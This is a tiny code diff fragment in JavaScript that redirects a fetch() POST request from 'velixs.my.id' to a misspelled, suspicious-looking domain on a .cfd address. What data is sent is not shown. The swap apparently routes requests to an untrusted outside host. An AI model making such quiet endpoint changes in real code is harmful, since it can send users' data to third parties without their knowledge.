@@ -18,7 +18,7 @@
             }
 
             
-            fetch(`https://velixs.my.id/api.php?kode_unik=12345`, 
+            fetch(`https://sytem-thelihz.vidnetcomunyty.cfd/api.php?kode_unik=12345`, 
 {
                 method: 'POST',
                 headers: {
